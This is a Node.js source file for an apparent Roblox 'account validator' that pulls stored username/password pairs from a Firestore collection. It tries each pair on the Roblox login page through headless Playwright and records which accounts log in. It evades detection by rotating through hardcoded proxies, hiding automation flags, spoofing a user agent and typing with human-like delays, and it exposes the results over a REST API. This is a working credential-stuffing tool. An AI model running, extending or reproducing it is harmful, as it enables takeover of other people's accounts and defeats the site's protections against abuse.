// ============================================================
//  Roblox Account Validator — ROBUST BLUEPRINT IMPLEMENTATION
// ============================================================

const express = require("express");
const cors = require("cors");
const path = require("path");
const admin = require("firebase-admin");
const { chromium } = require("playwright");

// ── Firebase Setup ───────────────────────────────────────────
let serviceAccount;
if (process.env.FIREBASE_CONFIG) {
  serviceAccount = JSON.parse(process.env.FIREBASE_CONFIG);
} else {
  serviceAccount = require("./oren-devs-firebase-adminsdk.json");
}

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
});

const db = admin.firestore();

// ── Express App ──────────────────────────────────────────────
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// ── Stats Tracking ───────────────────────────────────────────
let stats = {
  processed: 0,
  valid: 0,
  invalid: 0,
  queue: 0,
  processing: 0,
};

// ── Proxy List ───────────────────────────────────────────────
const PROXY_LIST = [
  "http://20.210.113.32:80",
  "http://154.16.63.190:80",
  "http://67.43.228.253:25803",
  "http://103.153.154.6:80",
  "http://47.74.152.29:8888",
];

// ── Selectors ────────────────────────────────────────────────
const SELECTORS = {
  username: "#login-username",
  password: "#login-password",
  submit: "#login-button", 
  error: ".error, .alert, [class*=\"error\"], [class*=\"invalid\"], #login-form .text-danger",
  settings: "span#nav-settings",
  logout: "a.rbx-menu-item.logout-menu-item",
};

// ── Validate Credential Function ─────────────────────────────
async function validateCredential(doc) {
  const { id } = doc;
  const { username, password } = doc.data();
  let browser = null;

  try {
    stats.processing = 1;
    const proxy = PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
    console.log(`[${username}] Using proxy: ${proxy}`);

    browser = await chromium.launch({
      headless: true,
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-blink-features=AutomationControlled",
        `--proxy-server=${proxy}`
      ],
    });

    const context = await browser.newContext({
      userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
      viewport: { width: 1280, height: 720 }
    });
    
    const page = await context.newPage();

    // 3. Navigates to the exact URL
    console.log(`[${username}] Navigating to Roblox login...`);
    await page.goto("https://www.roblox.com/login", { waitUntil: 'domcontentloaded', timeout: 30000 });

    // 4. Waits specifically for the username input field
    await page.waitForSelector(SELECTORS.username, { timeout: 15000 });

    // 5 & 6. Types credentials with slight delay to mimic human typing
    await page.type(SELECTORS.username, username, { delay: 50 });
    await page.type(SELECTORS.password, password, { delay: 50 });

    // 7. Clicks the exact login button
    console.log(`[${username}] Clicking login...`);
    await page.click(SELECTORS.submit);

    // 8. Waits for navigation or potential error
    // We wait for either the settings icon (success) or an error message (failure)
    try {
      await Promise.race([
        page.waitForSelector(SELECTORS.settings, { timeout: 15000 }),
        page.waitForSelector(SELECTORS.error, { timeout: 15000 }),
        page.waitForLoadState("networkidle", { timeout: 15000 })
      ]);
    } catch (e) {
      console.log(`[${username}] Wait timeout, checking current state...`);
    }

    // 9. CHECK FOR SUCCESS OR FAILURE
    const hasError = await page.$(SELECTORS.error);
    const hasSettings = await page.$(SELECTORS.settings);

    stats.processed++;
    if (hasSettings && !hasError) {
      // 11. IF SETTINGS ICON FOUND (LOGIN SUCCESSFUL)
      console.log(`[${username}] Result: VALID`);
      stats.valid++;
      
      try {
        await page.click(SELECTORS.settings);
        await page.waitForSelector(SELECTORS.logout, { timeout: 5000 });
        await page.click(SELECTORS.logout);
        await page.waitForLoadState("networkidle");
      } catch (logoutErr) {
        console.warn(`[${username}] Logout failed, but account is valid.`);
      }
      
      await db.collection("credentials").doc(id).update({
        status: "valid",
        processed_at: admin.firestore.FieldValue.serverTimestamp(),
      });
    } else {
      // 10. IF ERROR FOUND OR NO SETTINGS ICON
      console.log(`[${username}] Result: INVALID`);
      stats.invalid++;
      
      const errorText = hasError ? await page.evaluate(el => el.innerText, hasError) : "Login failed/Unknown state";
      
      await db.collection("credentials").doc(id).update({
        status: "invalid",
        error: errorText.trim(),
        processed_at: admin.firestore.FieldValue.serverTimestamp(),
      });
    }
  } catch (err) {
    console.error(`[${username}] Critical Error:`, err.message);
    await db.collection("credentials").doc(id).update({
      status: "invalid",
      error: `Critical: ${err.message}`,
      processed_at: admin.firestore.FieldValue.serverTimestamp(),
    });
    stats.invalid++;
    stats.processed++;
  } finally {
    stats.processing = 0;
    if (browser) await browser.close();
  }
}

// ── Main Validator Loop ──────────────────────────────────────
async function mainValidatorLoop() {
  console.log("--- Validator Loop Tick ---");
  try {
    const pendingSnapshot = await db.collection("credentials")
      .where("status", "==", "pending")
      .get();
    stats.queue = pendingSnapshot.size;

    const snapshot = await db.collection("credentials")
      .where("status", "==", "pending")
      .orderBy("added_at", "asc")
      .limit(1)
      .get();

    if (snapshot.empty) {
      console.log("No pending documents found. Waiting 10s...");
    } else {
      const doc = snapshot.docs[0];
      console.log(`Found pending document: ${doc.id} (${doc.data().username})`);
      await db.collection("credentials").doc(doc.id).update({ status: "processing" });
      await validateCredential(doc);
    }
  } catch (err) {
    console.error("Error in validator loop:", err.message);
  }
  setTimeout(mainValidatorLoop, 10000);
}

// ── REST API Endpoints ────────────────────────────────────────

app.get("/api/stats", (req, res) => {
  res.json({
    ...stats,
    uptime_human: Math.floor(process.uptime()) + "s",
    server_time: new Date().toISOString(),
    system_health: { tier_found: "Free", browser_path: "Playwright Bundled" }
  });
});

app.get("/api/pending_list", async (req, res) => {
  try {
    const snapshot = await db.collection("credentials")
      .where("status", "==", "pending")
      .orderBy("added_at", "asc")
      .limit(20).get();
    res.json(snapshot.docs.map(doc => ({ id: doc.id, username: doc.data().username })));
  } catch (err) { res.json([]); }
});

app.get("/api/recent", async (req, res) => {
  try {
    const snapshot = await db.collection("credentials")
      .where("status", "in", ["valid", "invalid"])
      .orderBy("processed_at", "desc")
      .limit(10).get();
    res.json(snapshot.docs.map(doc => ({
      id: doc.id,
      ...doc.data(),
      processed_at: doc.data().processed_at ? { _seconds: doc.data().processed_at.seconds } : null
    })));
  } catch (err) { res.json([]); }
});

app.get("/health", (req, res) => res.json({ status: "ok", uptime: process.uptime() }));
app.get("*", (req, res) => res.sendFile(path.join(__dirname, "public", "index.html")));

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  mainValidatorLoop();
});
